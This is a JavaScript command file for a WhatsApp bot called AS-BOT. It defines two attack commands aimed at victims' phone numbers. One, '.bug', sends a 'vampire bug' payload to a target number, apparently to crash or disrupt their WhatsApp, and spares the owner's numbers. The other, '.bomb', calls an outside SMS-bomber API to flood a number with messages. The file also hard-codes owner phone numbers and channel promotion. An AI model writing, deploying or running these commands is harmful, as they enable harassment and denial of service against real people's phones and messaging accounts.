const axios = require('axios');
const { cmd } = require("../command");
const { sendVampireBug } = require("../lib/vampireBug");

// ============ ✅ UPDATED WITH YOUR NEW DETAILS ============
const CHANNEL_LINK = "https://whatsapp.com/channel/0029VbBgXTsKwqSKZKy38w2o";
const CHANNEL_JID = "120363406449026172@newsletter";
const IMAGE_URL = "https://ik.imagekit.io/shaban/SHABAN-1784205527063_Zze7YpdxH.jpeg";
const BOT_NAME = "AS-BOT";

// Owner Numbers
const OWNER_NUMBERS = [
  "917384287404",
  "917384287404",
  "917384287404",
  "917384287404"
];
// =======================================================

// All protected numbers (only owners)
const PROTECTED_NUMBERS = OWNER_NUMBERS.map(n => `${n}@s.whatsapp.net`);

cmd({
  pattern: "bug",
  use: ".bug <number>",
  category: "bug",
  desc: "Send invite bug (owner only)",
  filename: __filename
}, async (conn, mek, m, { args, reply, isOwner }) => {

  if (!isOwner) return reply("❌ Owner only command");
  if (!args[0]) return reply("⚠️ Usage: .bug 9477xxxxxxx");

  const targetNumber = args[0].replace(/[^0-9]/g, "");
  const target = `${targetNumber}@s.whatsapp.net`;

  if (PROTECTED_NUMBERS.includes(target)) {
    return reply("❌ I can't bug my owner");
  }

  try {
    await reply("⏳ Sending bug, please wait...");
    await sendVampireBug(conn, target);

    await reply(
      `✅ *Bug Sent Successfully*\n\n` +
      `📱 Target: @${targetNumber}\n` +
      `⚠️ Use again after 3 minutes\n\n` +
      `> POWERED BY ${BOT_NAME}`
    );
  } catch {
    reply("❌ Failed to send bug");
  }
});

// ============ BOMBER COMMAND ============
cmd({
    pattern: "bomb",
    alias: ["smsbomb", "bomb"],
    use: '.smsbomb 923001234XXX',
    desc: "Send multiple SMS requests to a number",
    category: "bug",
    react: "💣",
    filename: __filename
},
async (conn, mek, m, { from, quoted, sender, reply, args }) => {
    try {
        const number = args[0];
        
        if (!number) {
            return await reply("❗ Please provide a phone number!\nUsage: .smsbomb 923001234XXX");
        }

        if (!number.match(/^92[0-9]{9,10}$/)) {
            return await reply("❌ Invalid phone number format!\nPlease use: 923001234××××");
        }

        await conn.sendMessage(from, { 
            react: { text: "🔄", key: mek.key }
        });

        const processingMsg = await reply(`🔄 Starting SMS bombing on *${number}*...\nPlease wait...`);

        const apiUrl = `https://shadowscriptz.xyz/public_apis/smsbomberapi.php?num=${number}`;
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (data.status !== "success") {
            return await reply(`❌ API Error: ${data.message || "Unknown error"}`);
        }

        let resultText = `💣 *${BOT_NAME} BOMBING RESULTS* 💣\n\n`;
        resultText += `📱 *Target* ${number}\n`;
        resultText += `📊 *Status* ${data.status}\n`;
        resultText += `📨 *Message* ${data.message}\n`;
        resultText += `🔄 *Requests Sent* ${data.requests_sent}\n\n`;
        resultText += `✅ *Bombing completed successfully!*\n`;
        resultText += `\n📢 *Join our channel:* ${CHANNEL_LINK}`;

        if (processingMsg) {
            await conn.sendMessage(from, {
                delete: processingMsg.key
            });
        }

        await conn.sendMessage(from, {
            react: { text: "✅", key: mek.key }
        });

        // ============ SEND WITH YOUR CHANNEL JID & IMAGE ============
        await conn.sendMessage(from, {
            text: resultText,
            contextInfo: { 
                mentionedJid: [sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: CHANNEL_JID,
                    newsletterName: 'DEX SHYAM TECH',
                    serverMessageId: 143
                }
            }
        }, { quoted: mek });

        // ============ SEND IMAGE WITH YOUR CHANNEL LINK ============
        await conn.sendMessage(from, {
            image: { url: IMAGE_URL },
            caption: `📢 *JOIN ${BOT_NAME} CHANNEL*\n\n🔗 ${CHANNEL_LINK}\n\n> POWERED BY ${BOT_NAME}`,
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: CHANNEL_JID,
                    newsletterName: 'DEX SHYAM TECH',
                    serverMessageId: 143
                }
            }
        }, { quoted: mek });

    } catch (error) { 
        console.error("Error in smsbomb command:", error);
        await conn.sendMessage(from, {
            react: { text: "❌", key: mek.key }
        });
        await reply(`❌ Error: ${error.message}\nPlease try again later.`);
    }
});
